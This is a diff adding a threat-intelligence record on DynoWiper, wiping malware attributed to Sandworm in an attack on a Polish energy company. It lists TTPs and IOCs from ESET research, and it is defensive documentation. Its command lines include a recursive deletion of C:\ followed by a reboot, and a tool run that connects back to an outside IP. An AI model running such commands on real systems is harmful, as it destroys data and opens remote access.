@@ -1,0 +1,48 @@
+description: DynoWiper data-wiping malware deployed against an energy company in Poland,
+  using techniques similar to those seen with the ZOV wiper.
+attribution: Sandworm
+malware_families:
+- DynoWiper
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - C:\\Users\\<USERNAME>\\Downloads\\r.exe -r 31.172.71[.]5:8008
+  - time /t & ver & rmdir C:\\ /s /q && dir && shutdown /r
+  powershell: []
+  scripting_engine:
+  - PowerShell
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - C:\\Users\\<USERNAME>\\Downloads\\r.exe
+  - 31.172.71[.]5
+  - '8008'
+  file_activity:
+  - C:\\inetpub\\pub\\schtask.exe
+  - C:\\inetpub\\pub\\schtask2.exe
+  - C:\\inetpub\\pub\\<redacted>_update.exe
+  - c:\\users\\<USERNAME>\\downloads\\rubeus.exe
+  - c:\\users\\<USERNAME>\\downloads\\r.exe
+  persistence:
+  - 'Scheduled Task/Job: Scheduled Task'
+  process_relations: []
+IOCs:
+  hashes:
+  - 472CA448F82A7FF6F373
+  - 4F8E9336A784A1963530
+  - 4EC3C90846AF6B79EE1A
+  - 86596A5C5B05A8BFBD14
+  - 69EDE7E341FD26FA0577
+  - 9EC4C38394EA2048CA81
+  - 410C8A57FE6E09EDBFEB
+  ip_addresses:
+  - 31.172.71[.]5
+  domains: []
+  urls: []
+authors:
+- ESET researchers
+reference: https://www.welivesecurity.com/en/eset-research/dynowiper-update-technical-analysis-attribution/
+date_of_publication: January 30, 2026
+file_creation_date: February 02, 2026
